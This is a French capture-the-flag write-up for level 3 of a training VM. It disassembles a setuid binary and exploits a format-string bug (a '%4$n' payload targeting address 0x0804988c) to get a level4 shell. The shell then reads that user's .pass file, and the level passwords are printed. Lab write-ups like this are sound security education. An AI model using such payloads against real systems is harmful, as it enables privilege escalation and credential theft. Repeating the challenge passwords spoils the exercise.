# LEVEL 3

### Reconnaissance

On se connection au level3 via le password : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```
level3@192.168.56.106's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
level3@RainFall:~$ ls
level3
level3@RainFall:~$ file level3 
level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
level3@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
```

On continue dans la meme lancer avec un binaire a corrompre.

On le rappatri sur notre poste afin de le désassembler avec des outils un peu plus confortable:
```
[0x080483f0]> pdf@sym.v
            ; CALL XREF from main @ 0x8048520
┌ 118: sym.v ();
│           ; var char *format @ ebp-0x208
│           ; var size_t size @ esp+0x4
│           ; var FILE *nitems @ esp+0x8
│           ; var FILE *stream @ esp+0xc
│           0x080484a4      55             push ebp
│           0x080484a5      89e5           mov ebp, esp
│           0x080484a7      81ec18020000   sub esp, 0x218
│           0x080484ad      a160980408     mov eax, dword [obj.stdin]  ; obj.stdin__GLIBC_2.0
│                                                                      ; [0x8049860:4]=0
│           0x080484b2      89442408       mov dword [nitems], eax     ; FILE *stream
│           0x080484b6      c74424040002.  mov dword [size], 0x200     ; [0x200:4]=-1 ; 512 ; int size
│           0x080484be      8d85f8fdffff   lea eax, dword [format]
│           0x080484c4      890424         mov dword [esp], eax        ; char *s
│           0x080484c7      e8d4feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x080484cc      8d85f8fdffff   lea eax, dword [format]
│           0x080484d2      890424         mov dword [esp], eax        ; const char *format
│           0x080484d5      e8b6feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x080484da      a18c980408     mov eax, dword [obj.m]      ; [0x804988c:4]=0
│           0x080484df      83f840         cmp eax, 0x40               ; 64
│       ┌─< 0x080484e2      7534           jne 0x8048518
│       │   0x080484e4      a180980408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│       │                                                              ; [0x8049880:4]=0
│       │   0x080484e9      89c2           mov edx, eax
│       │   0x080484eb      b800860408     mov eax, str.Wait_what      ; 0x8048600 ; "Wait what?!\n"
│       │   0x080484f0      8954240c       mov dword [stream], edx     ; FILE *stream
│       │   0x080484f4      c74424080c00.  mov dword [nitems], 0xc     ; [0xc:4]=-1 ; 12 ; size_t nitems
│       │   0x080484fc      c74424040100.  mov dword [size], 1         ; size_t size
│       │   0x08048504      890424         mov dword [esp], eax        ; const void *ptr
│       │   0x08048507      e8a4feffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)
│       │   0x0804850c      c704240d8604.  mov dword [esp], str.bin_sh ; [0x804860d:4]=0x6e69622f ; "/bin/sh" ; const char *string
│       │   0x08048513      e8a8feffff     call sym.imp.system         ; int system(const char *string)
│       │   ; CODE XREF from sym.v @ 0x80484e2
│       └─> 0x08048518      c9             leave
└           0x08048519      c3             ret
```

On voit qu'il compare eax (obj.m) avec 64 et selon le résultat, il prend ou non le jmp.

### Exploitation

Nous allons testé la présence de la vulnérabilité : Format string

Divers tutoriels et exemples qui nous servirons pour tous les formats strings du projet:
-  <a href="https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf">exploit-db</a>
-  <a href="https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf">crypto.standfort</a>
-  <a href="https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf">zenk-security</a>
-  <a href="https://www.hacktion.be/format-strings/">hacktion</a>

Pour faire simple, les format strings peuvent être utilisées de différentes manières.
Il est possible de :
- Lire du contenu en mémoire (%x)
- Ecrire du contenu en mémoire ( write-what-where ) (%n -> sur 4 bytes)
- Ecrire du contenu en mémoire ( write-what-where ) (%hn -> sur 2 bytes)

```
level3@RainFall:~$ python -c 'print "|%x|" * 50'|./level3 
|200||b7fd1ac0||b7ff37d0||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c||7c78257c|
level3@RainFall:~$ 
```
On arrive a print les adresses de la stack, le programme est vulnérable.

Il faut donc faire en sorte de mettre la global m a 64:
```
(gdb) i variables 
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m
[...]
```

Maintenant, nous avons l'adresse de m, on la converti pour notre payload:
```
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x0804988c)
'\x8c\x98\x04\x08'
```

On regarde la position du buffer dans la stack
```
level3@RainFall:~$ (python -c 'print "AAAA" + " %x" * 20')|./level3 
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a
```
On est a la 4eme position


Ensuite on peux préparé notre payload:
```
[ADRESSE][60 char][%<position dans la stack>$n]

[\x8c\x98\x04\x08]["A" * 60][%4$n]
```

Et le lancer:
```
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat)|./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
whoami
level4
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)

```

Il est possible de faire d'une autre manière:
```
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"'; cat)|./level3
```
Les explications seront pour le prochaine writeup :)

